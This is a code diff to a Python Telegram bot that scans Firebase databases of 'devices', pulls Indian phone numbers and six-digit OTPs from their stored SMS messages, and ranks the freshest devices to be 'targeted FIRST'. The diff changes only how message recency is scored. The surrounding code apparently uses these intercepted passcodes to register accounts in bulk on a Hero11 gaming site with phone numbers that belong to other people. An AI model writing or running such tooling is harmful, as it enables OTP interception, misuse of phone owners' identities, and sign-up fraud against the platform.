@@ -7,7 +7,7 @@ import uuid
 import random
 import json
 import gc
-from datetime import datetime, timedelta
+from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from curl_cffi import requests as cffi_requests
@@ -191,39 +191,10 @@ def extract_phone(messages_dict):
     match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
     return match.group(1) if match else None
 
-def parse_full_timestamp(time_str):
-    """Parses timestamps like '19-11-2026 | 03:51:00 pm' or '10:46 PM' into datetime objects."""
-    try:
-        time_str = time_str.strip().upper()
-        dt_match = re.search(r'(\d{2})-(\d{2})-(\d{4})\s*\|\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)', time_str)
-        if dt_match:
-            d, m, y, h, mn, s, period = dt_match.groups()
-            hour = int(h)
-            if period == "PM" and hour != 12:
-                hour += 12
-            if period == "AM" and hour == 12:
-                hour = 0
-            sec = int(s) if s else 0
-            return datetime(int(y), int(m), int(d), hour, int(mn), sec)
-        
-        t_match = re.search(r'(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM)', time_str)
-        if t_match:
-            h, mn, s, period = t_match.groups()
-            hour = int(h)
-            if period == "PM" and hour != 12:
-                hour += 12
-            if period == "AM" and hour == 12:
-                hour = 0
-            sec = int(s) if s else 0
-            now = datetime.now()
-            return datetime(now.year, now.month, now.day, hour, int(mn), sec)
-    except Exception:
-        pass
-    return None
-
-def get_latest_message_timestamp(messages_dict, bot_start_epoch):
+def get_latest_message_timestamp(messages_dict):
     """
-    Ranks devices by finding valid OTP messages from TODAY without restrictive time windows.
+    Scans the most recent 10 messages, filters spam, detects valid 6-digit OTPs,
+    and returns a recency score favoring messages closer to the end of the list.
     """
     if not isinstance(messages_dict, dict):
         return 0
@@ -231,33 +202,25 @@ def get_latest_message_timestamp(messages_dict, bot_start_epoch):
     msg_items = list(messages_dict.items())
     recent_ten = msg_items[-10:] if len(msg_items) >= 10 else msg_items
     
-    today_date = datetime.fromtimestamp(bot_start_epoch).date()
-    latest_epoch = 0
-
-    for _, msg_val in recent_ten:
+    latest_score = 0
+    for index, (_, msg_val) in enumerate(recent_ten):
         if isinstance(msg_val, dict):
             txt = str(msg_val.get("body") or msg_val.get("message") or "")
-            time_field = str(msg_val.get("time") or msg_val.get("timestamp") or "")
             
-            # Skip promotional channel spam
+            # Skip promotional spam
             if "FREE OTP PANNELS" in txt.upper() or "JOIN TELEGRAM" in txt.upper():
                 continue
             
-            otps = re.findall(r'\b\d{6}\b', txt) or re.findall(r'\b[A-Z0-9]{6}\b', txt)
+            # Strict 6-digit OTP check
+            otps = re.findall(r'\b\d{6}\b', txt)
             valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
             
-            if valid_otps or "VALID FOR" in txt.upper() or "CODE" in txt.upper():
-                msg_dt = parse_full_timestamp(time_field)
-                if msg_dt is not None:
-                    if msg_dt.date() == today_date:
-                        epoch = msg_dt.timestamp()
-                        if epoch > latest_epoch:
-                            latest_epoch = epoch
-                else:
-                    if latest_epoch == 0:
-                        latest_epoch = time.time() - 30
-                        
-    return latest_epoch
+            if valid_otps:
+                score = (index + 1) * 1000
+                if score > latest_score:
+                    latest_score = score
+                    
+    return latest_score
 
 class AsyncHero11Client:
     BASE_URL = "https://hero11-in.hero11apex.com"
@@ -634,8 +597,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    bot_start_epoch = time.time()  # Exact bot start timestamp anchoring
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Ranking active devices by today's recent messages...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Ranking devices by recent OTP message pattern...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -651,7 +613,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
                 
-                # --- BULK SCAN & RECENCY RANKING OF UNREGISTERED NUMBERS ---
+                # --- BULK SCAN & RECENCY SORTING OF UNREGISTERED NUMBERS ---
                 all_unregistered_candidates = []
                 
                 async with aiohttp.ClientSession() as session:
@@ -673,8 +635,8 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # GET RECENCY SCORE (Must be from today)
-                                                        recency_score = get_latest_message_timestamp(msgs, bot_start_epoch)
+                                                        # GET RECENCY SCORE BASED ON TOP 10 MESSAGES
+                                                        recency_score = get_latest_message_timestamp(msgs)
                                                         if recency_score > 0:
                                                             all_unregistered_candidates.append({
                                                                 "firebase_url": fb_url,
@@ -691,11 +653,11 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with today's messages found. Retrying in 5s...")
+                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with OTP patterns found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
-                # SORT CANDIDATES BY RECENCY: Freshest active devices are targeted FIRST
+                # SORT CANDIDATES BY RECENCY SCORE: Freshest active devices targeted FIRST
                 all_unregistered_candidates.sort(key=lambda x: x["recency_score"], reverse=True)
 
                 target = all_unregistered_candidates[0]
